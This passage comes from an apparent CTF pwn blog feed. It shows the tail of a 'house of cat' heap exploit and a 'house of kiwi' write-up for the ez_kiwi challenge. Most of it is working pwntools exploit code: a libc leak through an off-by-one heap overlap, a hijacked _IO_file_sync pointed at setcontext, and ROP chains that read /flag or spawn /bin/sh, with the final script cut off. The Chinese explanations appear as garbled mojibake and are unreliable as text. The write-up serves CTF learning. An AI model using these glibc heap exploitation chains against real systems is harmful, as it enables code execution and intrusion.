libcbase + <span class="hljs-number">0x22679</span><br>syscall_ret = libcbase + <span class="hljs-number">0x630a9</span><br>setcontext = libcbase + <span class="hljs-number">347936</span><br>mp = libcbase + <span class="hljs-number">2015944</span><br><br>add(<span class="hljs-string">b&#x27;aa&#x27;</span>)<br>edit(-<span class="hljs-number">8</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(mp))<br>heap_addr = u64(p.recv(<span class="hljs-number">8</span>))<br><span class="hljs-comment">#print(hex(heap_addr))</span><br>orw = p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span>) + p64(pop_rax) + p64(<span class="hljs-number">257</span>) + p64(syscall_ret)<br>orw += p64(pop_rax) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0x30</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(syscall_ret)<br>orw += p64(pop_rax) + p64(<span class="hljs-number">1</span>) + p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0x30</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(syscall_ret)<br><br>payload = <span class="hljs-string">b&#x27;/flag&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(setcontext + <span class="hljs-number">61</span>)<br>payload = payload.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0xc0</span>) + p64(ret)<br>payload = payload.ljust(<span class="hljs-number">0xc0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += orw<br>edit(<span class="hljs-number">0</span>, payload)<br><br>fake_IO_FILE = p64(<span class="hljs-number">0</span>) + p64(heap_addr + <span class="hljs-number">0x2a0</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>fake_IO_FILE += p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE += p64(heap_addr)<br>fake_IO_FILE += p64(magic_gadget)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(heap_addr + <span class="hljs-number">0x500</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_2_1_stdout  + <span class="hljs-number">0x30</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_wfile_jumps + <span class="hljs-number">0x10</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>fake_IO_FILE += p64(IO_2_1_stdout + <span class="hljs-number">0x40</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(-<span class="hljs-number">8</span>).encode())<br><br>p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, fake_IO_FILE)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>â€‹                                                                                         </p><p>å…³äºhouse of catæˆ‘æ²¡æœ‰è®²çš„å¤ªè¯¦ç»†ï¼Œå¤§å®¶å¯ä»¥å‚è€ƒçœ‹é›ªå¤§ä½¬çš„è¿™ç¯‡æ–‡ç« <a href="https://bbs.pediy.com/thread-273895.htm">https://bbs.pediy.com/thread-273895.htm</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Dest0g3 520è¿æ–°èµ› pwn ez_kiwi</title>
    <link href="/2022/11/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-pwn-ez_kiwi/"/>
    <url>/2022/11/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-pwn-ez_kiwi/</url>
    
    <content type="html"><![CDATA[<h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>é¢˜ç›®ç¯å¢ƒï¼šglibc-2.31</p><p>å¦‚å›¾åœ¨editçš„è¿‡ç¨‹ä¸­å¯¹é‡æ–°è¾“å…¥çš„å­—ç¬¦é•¿åº¦æœªæœ‰æ•ˆæ£€æŸ¥ï¼Œé€ æˆå•å­—èŠ‚æº¢å‡ºã€‚</p><p><img src="/img/1/1.png"></p><p> è¿™æ—¶æˆ‘ä»¬å°±å¯åˆ©ç”¨è¿™ä¸€æ¼æ´è®©å †å—é‡å ï¼Œä»è€Œæ³„æ¼libcçš„åœ°å€</p><p>æ³„æ¼libcçš„åœ°å€é¦–å…ˆæƒ³åˆ°çš„å°±æ˜¯unsorted binä¸­çš„main_arenaï¼Œç”±äºå­˜åœ¨tcacheï¼Œå¿…é¡»é‡Šæ”¾8ä¸ªå¤§å°ç›¸åŒæ‰ä¼šè¿›å…¥unsorted binï¼›åœ¨addçš„è¿‡ç¨‹ä¸­è¾“å…¥çš„idxå¯ä»¥å°äº0xfï¼Œä½†å®é™…ä¸Šè¶…è¿‡9å°±æ— æ³•æ­£å¸¸ç”³è¯·ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ç”³è¯·é‡Šæ”¾æ—¶è¦å°å¿ƒå †å—ä¸å¤Ÿå’Œtop chunkçš„åˆå¹¶ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):          <br> Â  Â add(<span class="hljs-number">0xb0</span>, i, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>, <span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">7</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)      <span class="hljs-comment">#é‡å çš„å †å—</span><br>add(<span class="hljs-number">0xb0</span>, <span class="hljs-number">9</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)      <span class="hljs-comment">#å…ˆé‡Šæ”¾è¿›å…¥tcacheï¼Œä¸ä¼štop chunkçš„åˆå¹¶</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">b&#x27;\xc1&#x27;</span><br>edit(<span class="hljs-number">6</span>, payload)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br> Â  Â delete(i)<br>delete(<span class="hljs-number">9</span>)<br>delete(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure><p>è¿™æ—¶å°±å¯ä»¥å¾—åˆ°libcçš„åœ°å€ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">leak = u64( p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) )<br>libcbase = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br></code></pre></td></tr></table></figure><p>ä¸€èˆ¬æƒ…å†µä¸‹æˆ‘ä»¬ä¼šä¿®æ”¹tcacheçš„fdæŒ‡é’ˆï¼ŒæŒ‡å‘<code>__malloc_hook</code>å’Œ<code>__free_hook</code>,å†æ¬¡ç”³è¯·æ—¶å°±ä½¿ç”¨systemæˆ–è€…one_gadgetå»å¡«å……è¯¥åœ°å€ã€‚ä½†æ˜¯è¿™é¢˜æ•…æ„ä¸è®©ä½ å»è¿™æ ·å»ä½¿ç”¨ï¼Œæ¯æ¬¡é‡æ–°å¼€å§‹å¾ªç¯æ—¶ä¼šè°ƒç”¨clearå‡½æ•°å°†<code>__malloc_hook</code>å’Œ<code>__free_hook</code>å…¨éƒ¨é‡ç½®ä¸º0ã€‚</p><img src="/img/1/2.png"  /><p><img src="/img/1/3.png"></p><h3 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h3><p>è¿™æ—¶æˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨house of kiwiè¿™ç§æ–¹å¼ï¼Œä¿®æ”¹<code>_IO_file_sync</code>å’Œ<code>_IO_helper_jumps</code>ä¸­çš„å€¼ã€‚</p><p>å…·ä½“è¿‡ç¨‹ä¾¿æ˜¯è§¦å‘<code>__malloc_assert</code>åï¼Œå»æ‰§è¡Œfflush (stderr)ï¼Œä¼šä½¿ç”¨<code>_IO_file_jumps</code>ä¸­çš„<code>_IO_file_sync</code>ï¼ŒRDXå¯„å­˜å™¨çš„å€¼ä¸º<code>IO_helper_jumps</code>æŒ‡é’ˆ,RDXå§‹ç»ˆæ˜¯ä¸€ä¸ªå›ºå®šçš„åœ°å€ã€‚</p><img src="/img/1/5.png"><p>ç„¶å<strong>é€šè¿‡ setcontext æ§åˆ¶å¯„å­˜å™¨çš„å€¼</strong>ã€‚</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; disassemble setcontext<br>   <span class="hljs-number">0x00007f38b563d0dd</span> &lt;+<span class="hljs-number">61</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsp</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0xa0</span>]#åˆ©ç”¨ä»£ç <br>   <span class="hljs-number">0x00007f38b563d0e4</span> &lt;+<span class="hljs-number">68</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x80</span>]<br>   <span class="hljs-number">0x00007f38b563d0eb</span> &lt;+<span class="hljs-number">75</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbp</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x78</span>]<br>   <span class="hljs-number">0x00007f38b563d0ef</span> &lt;+<span class="hljs-number">79</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r12</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x48</span>]<br>   <span class="hljs-number">0x00007f38b563d0f3</span> &lt;+<span class="hljs-number">83</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r13</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x50</span>]<br>   <span class="hljs-number">0x00007f38b563d0f7</span> &lt;+<span class="hljs-number">87</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r14</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x58</span>]<br>   <span class="hljs-number">0x00007f38b563d0fb</span> &lt;+<span class="hljs-number">91</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r15</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x60</span>]<br>   <span class="hljs-number">0x00007f38b563d0ff</span> &lt;+<span class="hljs-number">95</span>&gt;:    <span class="hljs-keyword">test</span>   <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">fs</span>:<span class="hljs-number">0x48</span>,<span class="hljs-number">0x2</span><br>   <span class="hljs-number">0x00007f38b563d10b</span> &lt;+<span class="hljs-number">107</span>&gt;:   <span class="hljs-keyword">je</span>     <span class="hljs-number">0x7f38b563d1c6</span> &lt;setcontext+<span class="hljs-number">294</span>&gt;<br>   â€¦â€¦â€¦â€¦<br>   â€¦â€¦â€¦â€¦<br>   <span class="hljs-number">0x00007f38b563d1c6</span> &lt;+<span class="hljs-number">294</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0xa8</span>]#åˆ©ç”¨ä»£ç <br>   <span class="hljs-number">0x00007f38b563d1cd</span> &lt;+<span class="hljs-number">301</span>&gt;:   <span class="hljs-keyword">push</span>   <span class="hljs-built_in">rcx</span><br>   <span class="hljs-number">0x00007f38b563d1ce</span> &lt;+<span class="hljs-number">302</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x70</span>]<br>   <span class="hljs-number">0x00007f38b563d1d2</span> &lt;+<span class="hljs-number">306</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x68</span>]<br>   <span class="hljs-number">0x00007f38b563d1d6</span> &lt;+<span class="hljs-number">310</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x98</span>]<br>   <span class="hljs-number">0x00007f38b563d1dd</span> &lt;+<span class="hljs-number">317</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r8</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x28</span>]<br>   <span class="hljs-number">0x00007f38b563d1e1</span> &lt;+<span class="hljs-number">321</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r9</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x30</span>]<br>   <span class="hljs-number">0x00007f38b563d1e5</span> &lt;+<span class="hljs-number">325</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x88</span>]<br>   <span class="hljs-number">0x00007f38b563d1ec</span> &lt;+<span class="hljs-number">332</span>&gt;:   <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span><br>   <span class="hljs-number">0x00007f38b563d1ee</span> &lt;+<span class="hljs-number">334</span>&gt;:   <span class="hljs-keyword">ret</span><br></code></pre></td></tr></table></figure><p>è®¾ç½®<code>rdx + 0xa0</code>æ¥æ§åˆ¶rspï¼Œä¹Ÿå°±æ˜¯æ§åˆ¶äº†æ ˆçš„åœ°å€ï¼Œé€šè¿‡æœ€åçš„retæŒ‡ä»¤å°±å¯ä»¥æ‰§è¡ŒROPã€‚</p><p>æ”»å‡»æµç¨‹å¦‚ä¸‹</p><p>å°†<code>_IO_file_jumps</code>ä¸­çš„<code>_IO_file_sync</code>ä¿®æ”¹ä¸º<code>setcontext + 61</code>çš„åœ°å€ï¼Œè®©ç¨‹åºæ‰§è¡Œsetcontextä¸­çš„ä»£ç ï¼›åŒæ—¶ä¿®æ”¹<code>_IO_helper_jumps + 0xa0 å’Œ _IO_helper_jumps + 0xa8</code>åˆ†åˆ«å­˜æ”¾æœ‰ROPçš„ä½ç½®å’ŒretæŒ‡ä»¤çš„gadgetä½ç½®ã€‚é¢˜ç›®æä¾›äº†libcæ–‡ä»¶ï¼Œåªéœ€åœ¨libcä¸­æ‰¾åˆ°ç›¸åº”çš„gadgetå†åŠ ä¸Šlibcçš„åŸºåœ°å€å³å¯ï¼Œå¯ä»¥é€šè¿‡æ³„æ¼å †çš„åœ°å€æ¥å­˜æ”¾gadgetã€‚</p><h3 id="å…·ä½“å®ç°"><a href="#å…·ä½“å®ç°" class="headerlink" title="å…·ä½“å®ç°"></a>å…·ä½“å®ç°</h3><p>å…³äºIO_helper_jumpsçš„åœ°å€å¯»æ‰¾ï¼šç”±äºpwntoolsæ— æ³•ä»æ–‡ä»¶ç›´æ¥å¾—åˆ°IO_helper_jumpsçš„ä¿¡æ¯ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡è¿™é“é¢˜æä¾›çš„libcæ–‡ä»¶åˆ©ç”¨idaä¸­æ‰¾åˆ°åç§»ï¼›ä½†å¦‚æœæ˜¯ä»pwndbgä¸­å¯»æ‰¾ï¼Œæ‰¾åˆ°çš„åœ°å€å¹¶ä¸æ˜¯<code>_IO_file_sync</code>ä¸­æ‰€åˆ©ç”¨çš„é‚£ä¸ªåœ°å€ï¼Œå¯¹æ¯”ä¸‹å›¾å’Œä¸Šå›¾å°±ä¼šå‘ç°éœ€è¦-0xc0æ‰æ˜¯æˆ‘ä»¬æ‰€éœ€è¦çš„åœ°å€ã€‚</p><p><img src="/img/1/4.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">IO_file_jumps = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>IO_helper_jumps = libcbase + <span class="hljs-number">2017632</span> - <span class="hljs-number">0xc0</span><br></code></pre></td></tr></table></figure><p> åˆ©ç”¨0x20å¤§å°çš„å †å—é‡å ï¼Œå¯ä»¥ä¿®æ”¹tcacheä¸­çš„fdæŒ‡é’ˆï¼Œå°±å¯å¯¹<code>IO_file_jumps</code>çš„åœ°å€ä¿®æ”¹ï¼Œå¹¶æ³„æ¼å †çš„åœ°å€ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x20</span>, <span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">3</span>)<br>delete(<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">2</span>, p64(IO_file_jumps + <span class="hljs-number">0x60</span>)+ <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">4</span>, p64(setcontext + <span class="hljs-number">61</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">5</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">5</span>)<br>delete(<span class="hljs-number">3</span>)<br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>heap_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[-<span class="hljs-number">8</span>:-<span class="hljs-number">2</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ROPgadget æ‰¾åˆ°ç›¸åº”çš„gadgetï¼Œåˆ©ç”¨ç³»ç»Ÿè°ƒç”¨å»æ‰§è¡Œexecve(â€œ&#x2F;bin&#x2F;shâ€,NULL,NULL) ï¼ˆå‚¨å­˜&#x2F;bin&#x2F;shçš„åœ°å€è‡ªå·±æ‰¾å¥½åç§»å³å¯ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">ret = libcbase + <span class="hljs-number">0x25679</span><br>pop_rax = libcbase + <span class="hljs-number">0x4a550</span><br>pop_rdi = libcbase + <span class="hljs-number">0x26b72</span><br>pop_rsi = libcbase + <span class="hljs-number">0x27529</span><br>pop_rdx_r12 = libcbase + <span class="hljs-number">0x11c371</span><br>syscall = libcbase + <span class="hljs-number">0x2584d</span><br>rop = p64(pop_rdx_r12) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) <br>rop += p64(heap_addr + <span class="hljs-number">0x30</span>) +p64(pop_rax) + p64(<span class="hljs-number">0x3b</span>) +p64(syscall)<br></code></pre></td></tr></table></figure><p>ç»§ç»­åˆ©ç”¨0x20å¤§å°çš„å †å—é‡å ï¼Œå»ä¿®æ”¹<code>_IO_helper_jumps + 0xa0 å’Œ _IO_helper_jumps + 0xa8</code>ä¸­çš„åœ°å€ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">6</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">1</span>, rop)<br>edit(<span class="hljs-number">2</span>, p64(IO_helper_jumps + <span class="hljs-number">0xa0</span>)+ <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">5</span>, p64(heap_addr -<span class="hljs-number">0x1b0</span>) + p64(ret))<br></code></pre></td></tr></table></figure><p>å…³äºè§¦å‘<code>__malloc_assert</code>ï¼šåœ¨top chunkä¸å¤Ÿä½¿ç”¨æ—¶å°±ä½¿ç”¨sysmallocï¼ŒåŒæ—¶å¯¹top chunkè¿›è¡Œä¸€ç³»åˆ—æ£€æŸ¥ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸æ˜¯ä¸ºäº†ç»•è¿‡æ£€æŸ¥ï¼Œè€Œæ˜¯æ•…æ„è®©å…¶ä¸èƒ½é€šè¿‡æ£€æŸ¥ã€‚è¿™é‡Œæ”¹å˜top chunkçš„å¤§å°ï¼Œä½¿å…¶ä¸èƒ½é¡µå¯¹é½ï¼Œå¹¶ä½¿ç”¨gift()å‡½æ•°ç”³è¯·0x25000å¤§å°çš„å †å—ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x28</span>, <span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span>+ <span class="hljs-string">b&#x27;\x00&#x27;</span><br>edit(<span class="hljs-number">6</span>, payload)<br>gift()<br></code></pre></td></tr></table></figure><p>å®Œæ•´çš„exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;ez_kiwi&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./ez_kiwi&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">27690</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;give me your name:\n&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,index,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;How much do you want?&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Which one do you want to put?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Tell me your idea:&#x27;</span>, content)<br><span 